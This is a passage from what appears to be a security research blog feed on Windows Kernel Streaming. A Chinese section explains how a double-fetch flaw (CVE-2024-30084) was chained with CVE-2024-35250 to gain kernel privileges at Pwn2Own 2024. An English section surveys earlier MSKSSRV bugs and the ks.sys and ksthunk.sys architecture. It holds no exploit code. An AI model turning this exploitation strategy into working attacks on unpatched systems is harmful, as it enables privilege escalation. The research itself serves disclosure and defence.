&lt;p&gt;在 Hyper-V 中，預設情況下只會有 MSKSSRV，然而 MSKSSRV 也沒有 KSPROPSETID_DrmAudioStream 這個 Property，使得我們無法成功利用這個漏洞達成 EoP，因此我們必須找其他方式觸發或者找新的漏洞，此時我們決定重新 Review 一遍整個流程，看看是否還有其他可能利用的地方。&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-30084&quot;&gt;CVE-2024-30084&lt;/h3&gt;
&lt;p&gt;重新審視後，發現到 IOCTL_KS_PROPERTY 是使用 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-neither-buffered-nor-direct-i-o&quot;&gt;Neither I/O&lt;/a&gt; 來傳遞資料的，也就是說會直接拿使用者的 Input buffer 來做資料上的處理，一般來說不太建議使用這個方法，很常出現 Double Fetch 的問題。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們可從上圖中 KspPropertyHandler 看到，在使用者呼叫 IOCTL 之後，會直接將 Type3InputBuffer 複製到新分配出來的 Buffer 中，其中會存有 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksproperty-structure&quot;&gt;KSPROPERTY&lt;/a&gt; 結構，接下來會用這結構中的 GUID 來查詢 Property 是否有在該設備所支援的 Property 中，若存在才會繼續往下呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;這邊我們再回頭看一眼 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們可以發現到，&lt;strong&gt;它又再次從 Type3InputBuffer 複製使用者所提供的資料&lt;/strong&gt;做為新的 IOCTL 的輸入，很明顯的這邊就存在了一個 Double Fetch 的漏洞，因此我們將整個利用流程改成下圖的樣子&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們一開始發送 IOCTL_KS_PROPERTY 時，就會先以 MSKSSRV 既有的 Property &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_Service&lt;/code&gt; 來做後續操作，而在圖中第 6 步時，會先複製一份 Property 的 GUID 到 Kernel 中，而後再用這個 Property GUID 去查詢是否有在該 KS Object 的支援清單中，而這邊因為 MSKSSRV 有支援，就會往下呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在呼叫 UnserializePropertySet 後，因為有 Double Fetch 的漏洞，讓我們可以在檢查後到使用之間，將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_Service&lt;/code&gt; 換成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; ，而接下來就可以讓 ks 使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; 作為 requests 來發送 IOCTL，從而觸發前述了 CVE-2024-35250 邏輯漏洞，使這個漏洞不論在甚麼環境下都可以使用。&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/xNUj_XZ9LhQ?si=ONmvl9_8BV-z0idL&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;最終我們成功在 Pwn2Own Vancouver 2024 中，成功攻下 Micorsoft Windows 11。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 Pwn2Own 結束後，經過我們調查，發現到這個漏洞從 Windows 7 就存在了，至少存在將近 20 年，而且利用上非常穩定，有著百分之百的成功率，強烈建議大家盡速更新至最新版本 。&lt;/p&gt;

&lt;h2 id=&quot;to-be-continued&quot;&gt;To be continued&lt;/h2&gt;
&lt;p&gt;這篇主要著重在我們如何找到今年在 Pwn2Own 中所使用的漏洞及 Kernel Streaming 的攻擊面分析。在找到這個洞之後，我們後續也持續朝這個方向繼續研究，也發現了另外一個也是 Exploitable 的漏洞以及其他更多有趣的漏洞，我們預計在今年十月發表，敬請期待 Part II。&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;Critically Close to Zero-Day: Exploiting Microsoft Kernel Streaming Service&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;Windows Kernel Security - A Deep Dive into Two Exploits Demonstrated at Pwn2Own&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;CVE-2023-29360 Analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could/&quot;&gt;Racing Round and Round: The Little Bug That Could&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html&quot;&gt;Hunting for Bugs in Windows Mini-Filter Drivers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/&quot;&gt;Local Privilege Escalation via the Windows I/O Manager: A Variant Finding &amp;amp; Collaboration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/</link>
                <guid>https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1</guid>
                <pubDate>Fri, 23 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Over the past few decades, vulnerabilities in the Windows Kernel have emerged frequently. The popular attack surface has gradually shifted from Win32k to CLFS (Common Log File System). Microsoft has continuously patched these vulnerabilities, making these targets increasingly secure. However, which component might become the next attack target? Last year, MSKSSRV (Microsoft Kernel Streaming Service) became a popular target for hackers. However, this driver is tiny and can be analyzed in just a few days. Does this mean there might not be new vulnerabilities?&lt;/p&gt;

&lt;p&gt;This research will discuss an overlooked attack surface that allowed us to find more than ten vulnerabilities within two months. Additionally, we will delve into a proxy-based logical vulnerability type that allows us to bypass most validations, enabling us to successfully exploit Windows 11 in Pwn2Own Vancouver 2024.&lt;/p&gt;

&lt;p&gt;(This research will be divided into several parts, each discussing different bug classes and vulnerabilities. This research was also presented at &lt;a href=&quot;https://hitcon.org/2024/CMT/agenda/d6903413-cfba-4b80-a758-af9a257063d0/&quot;&gt;HITCON CMT 2024&lt;/a&gt;.)&lt;/p&gt;

&lt;h2 id=&quot;start-from-mskssrv&quot;&gt;Start from MSKSSRV&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;For vulnerability research, looking at historical vulnerabilities is indispensable.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Initially, we aimed to challenge Windows 11 in Pwn2Own Vancouver 2024. Therefore, we began by reviewing past Pwn2Own events and recent in-the-wild Windows vulnerabilities, searching for potential attack surfaces. Historical trends show that Win32K, primarily responsible for handling GDI-related operations, has always been a popular target, with numerous vulnerabilities still emerging. Since 2018, CLFS (Common Log File System) has also gradually become a popular target. Both components are extremely complex, suggesting that there are likely still many vulnerabilities.  However, becoming familiar with these components requires significant time, and many researchers are already examining them. Therefore, we did not choose to analyze them first.&lt;/p&gt;

&lt;p&gt;Last year, after &lt;a href=&quot;https://www.synacktiv.com/en&quot;&gt;Synacktiv&lt;/a&gt; successfully exploited a &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360&quot;&gt;vulnerability&lt;/a&gt; in MSKSSRV to compromise Windows 11 during Pwn2Own 2023, many researchers began to focus on this component. Shortly thereafter, a second vulnerability ,&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36802&quot;&gt;CVE-2023-36802&lt;/a&gt;, was discovered. At this time, &lt;a href=&quot;https://x.com/chompie1337&quot;&gt;chompie&lt;/a&gt; also published an &lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;excellent blog post&lt;/a&gt; detailing this vulnerability and its exploitation techniques. Given that this component is very small, with a file size of approximately 72 KB, it might only take a few days of careful examination to fully understand it. Therefore, we chose MSKSSRV for historical vulnerability analysis, with the hopeful prospect of identifying other vulnerabilities.&lt;/p&gt;

&lt;p&gt;We will briefly discuss these two vulnerabilities but not go into much detail.&lt;/p&gt;

&lt;h3 id=&quot;cve-2023-29360---logical-vulnerability&quot;&gt;CVE-2023-29360 - logical vulnerability&lt;/h3&gt;
&lt;p&gt;The first one is the vulnerability used by Synacktiv in Pwn2Own Vancouver 2023.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is a logical vulnerability in the MSKSSRV driver. When MSKSSRV uses &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmprobeandlockpages&quot;&gt;MmProbeAndLockPages&lt;/a&gt; to lock user-specified memory address as framebuffer, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AccessMode&lt;/code&gt; was not set correctly. This leads to a failure to check whether the user-specified address belongs to the user space. If the user provides a kernel address, it will map the specified kernel address to user space for the user to use. Ultimately, this allows the user to write data to any address in the kernel. The exploitation is simple and very stable, making it become &lt;a href=&quot;https://www.cisa.gov/news-events/alerts/2024/02/29/cisa-adds-one-known-exploited-vulnerability-catalog&quot;&gt;one of the most popular vulnerabilities&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For more details, please refer to &lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;Synacktiv’s presentation at HITB 2023 HKT&lt;/a&gt; and &lt;a href=&quot;https://x.com/Big5_sec&quot;&gt;Nicolas Zilio(@Big5_sec)&lt;/a&gt; ‘s blog &lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;post&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;cve-2023-36802---type-confusion&quot;&gt;CVE-2023-36802 - type confusion&lt;/h3&gt;
&lt;p&gt;This vulnerability was discovered shortly after CVE-2023-29360 was released. It was already being exploited when Microsoft released their patches. This is a very easily discovered vulnerability. It uses the objects (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FSContextReg&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FSStreamReg&lt;/code&gt;) stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE_OBJECT-&amp;gt;FsContext2&lt;/code&gt; for subsequent processing. However, there is no check on the type of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FsContext2&lt;/code&gt;, leading to type confusion. For detailed information, you can refer to the &lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;IBM X-Force blog&lt;/a&gt;, which provides a very thorough explanation.&lt;/p&gt;

&lt;p&gt;Since then, there have been very few vulnerabilities related to MSKSSRV. Due to its relatively small size, MSKSSRV is quickly reviewed, and gradually, fewer and fewer people pay attention to it.&lt;/p&gt;

&lt;h3 id=&quot;but-is-that-the-end-of-it-&quot;&gt;But is that the end of it ?&lt;/h3&gt;
&lt;p&gt;However, does this mean there are no more vulnerabilities?&lt;/p&gt;

&lt;p&gt;In fact, the entire Kernel Streaming looks like the diagram below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;MSKSSRV is just the tip of the iceberg. In fact, there are many other potential components, and those listed in the diagram above are all part of Kernel Streaming. After delving into this attack surface, numerous vulnerabilities were eventually discovered, flowing like a stream.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/cover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By the way, while I was writing this blog, chompie also &lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could&quot;&gt;published&lt;/a&gt; about the vulnerability she used in this year’s Pwn2Own Vancouver 2024, &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30089&quot;&gt;CVE-2024-30089&lt;/a&gt;, which is also a vulnerability in MSKSSRV. The vulnerability lies in handling the reference count, requiring a lot of attention and thought to discover. It is also quite interesting, but I won’t discuss it here. I highly recommend reading &lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could&quot;&gt;this one&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;brief-overview-of-kernel-streaming&quot;&gt;Brief overview of Kernel Streaming&lt;/h2&gt;
&lt;p&gt;So, what is Kernel Streaming? In fact, we use it very frequently.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On Windows systems, when we open the webcam, enable sound, and activate audio devices such as microphones, the system needs to write or read related data such as your voice and captured images from your devices into RAM. It is essential to read data into your computer more efficiently during this process. Microsoft provides a framework called &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/kernel-streaming&quot;&gt;Kernel Streaming&lt;/a&gt; to handle these data, which &lt;strong&gt;primarily operates in kernel mode&lt;/strong&gt;. It features low latency, excellent scalability, and a unified interface, making handling streaming data more convenient and efficient.&lt;/p&gt;

&lt;p&gt;In Microsoft’s Kernel Streaming, three multimedia class driver models are provided: port class, AVStream, and stream class. We will briefly introduce port class and AVStream, as stream class is less common and more outdated and will not be discussed here.&lt;/p&gt;

&lt;h3 id=&quot;port-class&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/introduction-to-port-class&quot;&gt;Port class&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;This type of driver is mostly used for PCI and DMA-based audio device hardware drivers. Currently, most audio-related processing, such as volume control or microphone-related processing, falls into this category. The main component library used would be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;portcls.sys&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;avstream&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/avstream-overview&quot;&gt;AVStream&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;AVStream is a multimedia driver provided by Microsoft that primarily supports video-only and integrated audio/video streaming. Currently, most video-related processing, such as your webcam, capture card, etc., is associated with this category.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, the use of Kernel Streaming is also very complex. We will only provide a brief description. For more detailed information, please refer to &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/&quot;&gt;Microsoft Learn&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;interact-with-device&quot;&gt;Interact with device&lt;/h2&gt;

&lt;p&gt;When we want to interact with audio devices or webcams, we need to open the device just like with any other device. Essentially, it interacts with the device driver in the same way. So, what would the names of these types of devices be? These names are not typically like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\Device\NamedPipe&lt;/code&gt;, but rather something like the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\?\hdaudio#subfunc_01&amp;amp;ven_8086&amp;amp;dev_2812&amp;amp;nid_0001&amp;amp;subsys_00000000&amp;amp;rev_1000#6&amp;amp;2f1f346a&amp;amp;0&amp;amp;0002&amp;amp;0000001d#{6994ad04-93ef-11d0-a3cc-00a0c9223196}\ehdmiouttopo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;enumerate-device&quot;&gt;Enumerate device&lt;/h3&gt;
&lt;p&gt;Here you can use APIs such as &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows/win32/api/setupapi/nf-setupapi-setupdigetclassdevsw&quot;&gt;SetupDiGetClassDevs&lt;/a&gt; to enumerate devices. Generally, KS series devices are registered under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSCATEGORY*&lt;/code&gt;, such as audio devices which are registered under &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/install/kscategory-audio&quot;&gt;KSCATEGORY_AUDIO&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Additionally, you can use the APIs provided by KS, such as &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ksproxy/nf-ksproxy-ksopendefaultdevice&quot;&gt;KsOpenDefaultDevice&lt;/a&gt;, to obtain the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handle&lt;/code&gt; of the first matching PnP device in that category. Actually, it is just a wrapper around &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetupDiGetClassDevs&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateFile&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KsOpenDefaultDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSCATEGORY_VIDEO_CAMERA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_READ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;kernel-streaming-object&quot;&gt;Kernel Streaming object&lt;/h3&gt;

&lt;p&gt;After we open these devices, Kernel Streaming will create some Kernel Streaming related instances, the most important of which are &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-filters&quot;&gt;KS Filters&lt;/a&gt; and &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-pins&quot;&gt;KS Pins&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;These will be used during the Kernel Streaming process. We will only provide a brief introduction here. We will use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters&quot;&gt;audio filters&lt;/a&gt; as an example, as most others are quite similar.&lt;/p&gt;

&lt;h4 id=&quot;ks-filters&quot;&gt;KS filters&lt;/h4&gt;
&lt;p&gt;Each KS Filter typically represents a device or a specific function of a device. When we open an audio device, it usually corresponds to a KS filter object. When we read data from the audio device, this data is first processed through this KS Filter.&lt;/p&gt;

&lt;p&gt;Conceptually, as shown in the diagram below, the large box in the middle represents a KS filter for the audio device. When we want to read data from the audio device, it is read into the filter from the left, processed through several nodes, and then output from the right.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/7.png&quot; alt=&quot;&quot; /&gt;
 (From: https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters)&lt;/p&gt;

&lt;h4 id=&quot;ks-pins&quot;&gt;KS pins&lt;/h4&gt;
&lt;p&gt;In the figure above, the points for reading and outputting data are called pins. The kernel also has corresponding KS pin Objects to describe the Pins, recording whether the Pin is a sink or a source, the data format for input and output, and so on. When we use it, we must &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/nf-ks-kscreatepin&quot;&gt;open a pin&lt;/a&gt; on the filters to create an instance to read from or write to the device.&lt;/p&gt;

&lt;h3 id=&quot;ks-property&quot;&gt;KS property&lt;/h3&gt;

&lt;p&gt;Each of these KS objects will have its own property, and each property corresponds to a specific feature. For instance, the data format mentioned earlier in the Pin, the volume level, and the status of the device are all properties. These properties typically correspond to a set of GUIDs. We can set these properties through &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_property&quot;&gt;IOCTL_KS_PROPERTY&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This greatly simplifies the development of multimedia drivers and ensures consistency and scalability across different devices.&lt;/p&gt;

&lt;h3 id=&quot;read-streams-from-webcam&quot;&gt;Read streams from webcam&lt;/h3&gt;
&lt;p&gt;Here is a simple example illustrating how an application can read data from a webcam.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The most basic flow is roughly shown in this diagram:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Open the device to obtain the device handle.&lt;/li&gt;
  &lt;li&gt;Use this device handle to create an instance of the Pin on this filter and obtain the Pin handle.&lt;/li&gt;
  &lt;li&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; to set the device state of the Pin to RUN.&lt;/li&gt;
  &lt;li&gt;Finally, you can use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_read_stream&quot;&gt;IOCTL_KS_READ_STREAM&lt;/a&gt; to read data from this Pin.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;kernel-streaming-architecture&quot;&gt;Kernel Streaming architecture&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;For vulnerability research, we must first understand its architecture and consider the potential attack surfaces.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;After gaining a preliminary understanding of the functionalities and operations of Kernel Streaming, we need to understand the architecture to find vulnerabilities. It’s crucial to know how Windows implements these functions and what components are involved. This way, we can identify which sys files to analyze and where to start.&lt;/p&gt;

&lt;p&gt;After our analysis, the overall architecture looks approximately like this diagram:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the Kernel Streaming components, the most important ones are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;. Almost all functionalities are related to them.&lt;/p&gt;

&lt;h3 id=&quot;ksthunk-kernel-streaming-wow-thunk-service-driver&quot;&gt;ksthunk (Kernel Streaming WOW Thunk Service Driver)&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; is the entry point in Kernel Streaming. Its function is quite simple: it converts 32-bit requests from the WoW64 process into 64-bit requests, allowing the underlying driver to handle the requests without additional processing for 32-bit structures.&lt;/p&gt;

&lt;h3 id=&quot;ks-kernel-connection-and-streaming-architecture-library&quot;&gt;ks (Kernel Connection and Streaming Architecture Library)&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; is one of the &lt;strong&gt;core components of Kernel Streaming&lt;/strong&gt;. It is the library of Kernel Streaming responsible for forwarding requests such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; to the corresponding device driver, and it also handles functions related to AVStream.&lt;/p&gt;

&lt;h3 id=&quot;the-work-flow-of-ioctl_ks_&quot;&gt;The work flow of IOCTL_KS_*&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; will be used as an example here. When calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DeviceIoControl&lt;/code&gt;, as shown in the figure below, the user’s request will be sequentially passed to the corresponding driver for processing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At step 6, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will determine which driver and handler to hand over your request based on the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure&quot;&gt;KSPROPERTY&lt;/a&gt; you requested.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, forward it to the corresponding driver, as shown in the figure above, where it is ultimately forwarded to the handler in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;portcls&lt;/code&gt; to operate the audio device.&lt;/p&gt;

&lt;p&gt;You should now have a preliminary understanding of the architecture and process of Kernel Streaming. Next, it’s time to look for vulnerabilities.&lt;/p&gt;

&lt;p&gt;Based on the existing elements, which attack surfaces are worth examining?&lt;/p&gt;

&lt;h3 id=&quot;from-attackers-view&quot;&gt;From attacker’s view&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;　Before digging for vulnerabilities, if you can carefully consider under what circumstances they are likely to occur, you can achieve twice the result with half the effort.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;From a vulnerability researcher’s perspective, there are a few key points to consider:&lt;/p&gt;

&lt;h4 id=&quot;1-property-handler-in-each-device&quot;&gt;1. Property handler in each device&lt;/h4&gt;
&lt;p&gt;KS object for each device has its own properties, and each property has its own handler. Some properties are prone to issues during handling.&lt;/p&gt;

&lt;h4 id=&quot;2-ks-and-ksthunk&quot;&gt;2. ks and ksthunk&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt; have not had vulnerabilities for a long time, but they are the most accessible entry points and might be good targets. The last vulnerabilities(&lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-16889&quot;&gt;CVE-2020-16889&lt;/a&gt; and &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17045&quot;&gt;CVE-2020-17045&lt;/a&gt;) were found in 2020 by &lt;a href=&quot;https://x.com/nghiadt1098&quot;&gt;@nghiadt1098&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&quot;3-each-driver-handles-a-part-of-the-content&quot;&gt;3. Each driver handles a part of the content&lt;/h4&gt;
&lt;p&gt;In some functionalities of Kernel Streaming, certain drivers handle parts of the input individually, which may lead to inconsistencies.&lt;/p&gt;

